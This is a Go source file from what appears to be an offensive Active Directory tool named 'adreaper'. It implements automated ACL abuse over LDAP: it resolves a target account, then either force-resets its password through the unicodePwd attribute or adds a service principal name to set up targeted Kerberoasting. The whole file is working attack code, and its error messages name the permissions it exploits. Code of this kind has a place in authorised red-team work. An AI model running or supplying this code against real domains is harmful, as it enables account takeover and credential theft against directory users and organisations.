package attacks

import (
	"context"
	"fmt"
	"strings"

	"adreaper/internal/config"
	"adreaper/internal/output"
	"adreaper/internal/recon"

	ldap "github.com/go-ldap/ldap/v3"
)

// ACLAbuseAttack performs automated abuse of dangerous ACLs.
func ACLAbuseAttack(ctx context.Context, opts *config.Options, targetSAM, action, value string) error {
	output.Info("Executing ACL Abuse: %s on %s", action, targetSAM)

	ldapCl, err := recon.NewLDAPClient(opts)
	if err != nil {
		return err
	}
	defer ldapCl.Close()

	// 1. Get target DN
	filter := fmt.Sprintf("(sAMAccountName=%s)", targetSAM)
	entries, err := ldapCl.Search(ctx, filter, []string{"distinguishedName"})
	if err != nil || len(entries) == 0 {
		return fmt.Errorf("could not find target: %s", targetSAM)
	}
	targetDN := entries[0].DN

	switch strings.ToLower(action) {
	case "reset-password":
		return resetPassword(ldapCl, targetDN, value)
	case "add-spn":
		return addSPN(ldapCl, targetDN, value)
	default:
		return fmt.Errorf("unsupported action: %s", action)
	}
}

func resetPassword(c *recon.LDAPClient, dn, newPass string) error {
	if newPass == "" {
		return fmt.Errorf("new password is required for reset-password")
	}

	output.Info("Attempting to reset password for %s...", dn)

	// Format password for Active Directory (UTF-16LE, quoted)
	quotedPass := fmt.Sprintf("\"%s\"", newPass)
	utf16Pass := make([]byte, len(quotedPass)*2)
	for i, r := range quotedPass {
		utf16Pass[i*2] = byte(r)
		utf16Pass[i*2+1] = 0
	}

	mod := ldap.NewModifyRequest(dn, nil)
	mod.Replace("unicodePwd", []string{string(utf16Pass)})

	if err := c.Modify(mod); err != nil {
		return fmt.Errorf("failed to reset password (missing ForceChangePassword permission?): %w", err)
	}

	output.Success("Password reset successfully to: %s", newPass)
	return nil
}

func addSPN(c *recon.LDAPClient, dn, spn string) error {
	if spn == "" {
		return fmt.Errorf("SPN value is required for add-spn")
	}

	output.Info("Attempting to add SPN %s to %s...", spn, dn)

	mod := ldap.NewModifyRequest(dn, nil)
	mod.Add("servicePrincipalName", []string{spn})

	if err := c.Modify(mod); err != nil {
		return fmt.Errorf("failed to add SPN (missing GenericWrite permission?): %w", err)
	}

	output.Success("SPN %s added successfully!", spn)
	return nil
}
